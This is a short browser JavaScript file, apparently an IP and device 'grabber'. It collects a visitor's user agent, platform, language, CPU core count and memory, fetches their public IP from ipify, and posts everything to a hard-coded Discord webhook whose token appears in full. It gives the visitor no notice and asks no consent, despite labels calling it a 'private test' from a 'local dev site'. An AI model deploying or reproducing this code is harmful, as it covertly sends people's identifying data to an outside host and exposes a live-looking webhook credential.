// Replace with your Discord webhook URL
const webhookURL = 'https://discord.com/api/webhooks/1399534764230443108/mhzIpMHKMZRC_-wWKSXy4wLKqtOOYkwIZX2dInRUoFx8haaA17m8vwkpjyG1uqQvpvVu';

// Get browser/device info
const browserInfo = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  hardwareConcurrency: navigator.hardwareConcurrency,
  deviceMemory: navigator.deviceMemory || "Unknown"
};

// Get public IP
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const publicIP = data.ip;

    // Message to send
    const payload = {
      content: "**📄 Device Info Log (Private Test)**",
      embeds: [{
        title: "🔍 Client Details",
        color: 0x3498db,
        fields: [
          { name: "🌐 Public IP", value: publicIP, inline: false },
          { name: "🖥️ Platform", value: browserInfo.platform, inline: true },
          { name: "🌎 Language", value: browserInfo.language, inline: true },
          { name: "🧠 CPU Cores", value: `${browserInfo.hardwareConcurrency}`, inline: true },
          { name: "💾 Device RAM", value: `${browserInfo.deviceMemory} GB`, inline: true },
          { name: "📱 User Agent", value: browserInfo.userAgent, inline: false }
        ],
        footer: {
          text: "Test log from local dev site"
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Send to Discord webhook
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
    .then(() => console.log("Info sent to Discord."))
    .catch(err => console.error("Failed to send to Discord:", err));
  })
  .catch(err => console.error("Failed to get public IP:", err));
